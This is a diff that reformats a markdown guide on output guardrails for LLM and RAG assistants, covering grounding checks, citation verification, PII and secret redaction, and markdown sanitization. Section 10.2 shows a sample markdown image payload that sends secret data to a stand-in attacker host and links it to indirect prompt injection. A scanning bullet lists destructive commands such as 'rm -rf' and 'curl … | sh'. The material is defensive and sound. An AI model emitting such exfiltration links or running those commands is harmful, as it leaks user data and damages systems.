@@ -1,14 +1,19 @@
 # Output Guardrails
 
 > **TL;DR**
+>
 > - **Gate every response before display.** Run output guardrails as the final check before an answer reaches a user or downstream system.
 > - **Verify grounding and citations first.** Confirm that permitted context supports every claim and that cited chunk IDs are real and authorized.
 > - **Scrub leaks and unsafe markup.** Redact PII, block secrets and system-prompt leaks, validate schemas, and sanitize markdown links and images.
 > - **Choose deliberate failure actions.** Decide per rail whether to repair, regenerate, fall back, or refuse, and buffer high-risk streams.
 
-**You will learn:** Output rail ordering · Groundedness and citation verification · PII, secret, and system-prompt leak detection · Schema validation, markdown sanitization, streaming, and fallback policies  
-**Prerequisites:** [Guardrails architecture](./01-guardrails-architecture.md), [End-to-end RAG evals](../02-offline-evals/01-end-to-end-rag-evals.md)  
-**Related:** [Retrieval & context guardrails](./03-retrieval-and-context-guardrails.md), [Input guardrails](./02-input-guardrails.md), [Tool & action guardrails](./05-tool-and-action-guardrails.md), [Instruction & citation adherence](../02-offline-evals/06-instruction-and-citation-adherence.md), [Generation quality & safety evals](../02-offline-evals/03-generation-quality-and-safety-evals.md), [LLM-as-a-judge](../02-offline-evals/07-llm-as-a-judge.md)
+- **You will learn:**
+    - Output rail ordering
+    - Groundedness and citation verification
+    - PII, secret, and system-prompt leak detection
+    - Schema validation, markdown sanitization, streaming, and fallback policies
+- **Prerequisites:** [Guardrails architecture](./01-guardrails-architecture.md), [End-to-end RAG evals](../02-offline-evals/01-end-to-end-rag-evals.md)
+- **Related:** [Retrieval & context guardrails](./03-retrieval-and-context-guardrails.md), [Input guardrails](./02-input-guardrails.md), [Tool & action guardrails](./05-tool-and-action-guardrails.md), [Instruction & citation adherence](../02-offline-evals/06-instruction-and-citation-adherence.md), [Generation quality & safety evals](../02-offline-evals/03-generation-quality-and-safety-evals.md), [LLM-as-a-judge](../02-offline-evals/07-llm-as-a-judge.md)
 
 ---
 
@@ -74,7 +79,7 @@ flowchart TD
 
 ### Actions (from least to most disruptive)
 
-| Situation (heuristic thresholds — tune on your data) | Action |
+| Situation (heuristic thresholds, tune on your data) | Action |
 |---|---|
 | All claims ≥ 0.5 | Allow |
 | A few non-essential sentences unsupported | **Modify**: drop or hedge those sentences ("I couldn't confirm …") |
@@ -110,7 +115,7 @@ def groundedness_gate(
 ```
 
 ```python
-# HHEM as the `entail` function — per the model card; verify the current API.
+# HHEM as the `entail` function (per the model card; verify the current API).
 from transformers import AutoModelForSequenceClassification
 
 hhem = AutoModelForSequenceClassification.from_pretrained(
@@ -190,6 +195,7 @@ def verify_citations(answer: str, retrieved: dict[str, str], permitted: set[str]
 **What.** Detect personal data, credentials, and other sensitive values in the generated output.
 
 **Why.** Outputs can leak sensitive data from several sources:
+
 - Permitted documents that contain third-party details (such as a colleague's phone number in an incident report).
 - The model's parametric memory.
 - Tool results (such as raw SQL rows).
@@ -372,7 +378,7 @@ When the assistant *displays* SQL or code to the user, check it before rendering
 - **Numbers in the answer vs result set**: verify that every number in the answer appears in or derives from the SQL result set. Mismatches are hallucinations even when the SQL query is valid.
 - **Code suggestions**: scan for secrets, hard-coded credentials, destructive commands (`rm -rf`, `DROP DATABASE`, `curl … | sh`), and unapproved packages. Flag risky code or attach warnings, and never auto-execute code from an answer.
 
-### 10.2 Markdown, HTML, and links — the exfiltration channel
+### 10.2 Markdown, HTML, and links: the exfiltration channel
 
 If your UI renders markdown, an image tag like `![x](https://attacker.example/log?d=<secret data>)` makes the **user's browser** send data to the attacker on load. No click is needed. When combined with indirect prompt injection ([03 §5](./03-retrieval-and-context-guardrails.md#5-indirect-prompt-injection-in-retrieved-content)), this pattern exfiltrates data from LLM chat products. Markdown links (`[click here](…)`) are the click-required variant.
 
@@ -493,14 +499,18 @@ Evaluate output guardrails with the same metrics as other rails ([architecture �
 
 ## Further reading
 
-- Vectara — [HHEM hallucination evaluation model](https://huggingface.co/vectara/hallucination_evaluation_model) · [Hallucination leaderboard](https://github.com/vectara/hallucination-leaderboard)
-- Min et al. — [FActScore: Fine-grained Atomic Evaluation of Factual Precision in Long Form Text Generation](https://arxiv.org/abs/2305.14251)
-- Manakul et al. — [SelfCheckGPT: Zero-Resource Black-Box Hallucination Detection for Generative Large Language Models](https://arxiv.org/abs/2303.08896)
-- Es et al. — [RAGAS: Automated Evaluation of Retrieval Augmented Generation](https://arxiv.org/abs/2309.15217)
-- Microsoft — [Groundedness detection in Azure AI Content Safety](https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/groundedness)
+- Vectara, [HHEM hallucination evaluation model](https://huggingface.co/vectara/hallucination_evaluation_model) · [Hallucination leaderboard](https://github.com/vectara/hallucination-leaderboard)
+- Min et al., [FActScore: Fine-grained Atomic Evaluation of Factual Precision in Long Form Text Generation](https://arxiv.org/abs/2305.14251)
+- Manakul et al., [SelfCheckGPT: Zero-Resource Black-Box Hallucination Detection for Generative Large Language Models](https://arxiv.org/abs/2303.08896)
+- Es et al., [RAGAS: Automated Evaluation of Retrieval Augmented Generation](https://arxiv.org/abs/2309.15217)
+- Microsoft, [Groundedness detection in Azure AI Content Safety](https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/groundedness)
 - [Guardrails AI](https://github.com/guardrails-ai/guardrails) · [Guardrails Hub](https://hub.guardrailsai.com/) · [Pydantic](https://docs.pydantic.dev/latest/) · [JSON Schema](https://json-schema.org/)
-- Inan et al. — [Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations](https://arxiv.org/abs/2312.06674)
-- Anthropic — [Reduce hallucinations](https://docs.anthropic.com/en/docs/test-and-evaluate/strengthen-guardrails/reduce-hallucinations)
-- OWASP — [Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) (Improper Output Handling, Sensitive Information Disclosure, System Prompt Leakage)
-- NVIDIA — [NeMo Guardrails documentation](https://docs.nvidia.com/nemo/guardrails/latest/index.html) (output and streaming rails)
-- In this repo: [End-to-end RAG evals](../02-offline-evals/01-end-to-end-rag-evals.md) · [Instruction & citation adherence](../02-offline-evals/06-instruction-and-citation-adherence.md) · [LLM-as-a-judge](../02-offline-evals/07-llm-as-a-judge.md) · [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md)
+- Inan et al., [Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations](https://arxiv.org/abs/2312.06674)
+- Anthropic, [Reduce hallucinations](https://docs.anthropic.com/en/docs/test-and-evaluate/strengthen-guardrails/reduce-hallucinations)
+- OWASP, [Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) (Improper Output Handling, Sensitive Information Disclosure, System Prompt Leakage)
+- NVIDIA, [NeMo Guardrails documentation](https://docs.nvidia.com/nemo/guardrails/latest/index.html) (output and streaming rails)
+- **In this repo:**
+    - [End-to-end RAG evals](../02-offline-evals/01-end-to-end-rag-evals.md)
+    - [Instruction & citation adherence](../02-offline-evals/06-instruction-and-citation-adherence.md)
+    - [LLM-as-a-judge](../02-offline-evals/07-llm-as-a-judge.md)
+    - [Guardrail tools](../06-tooling-landscape/02-guardrail-tools.md)
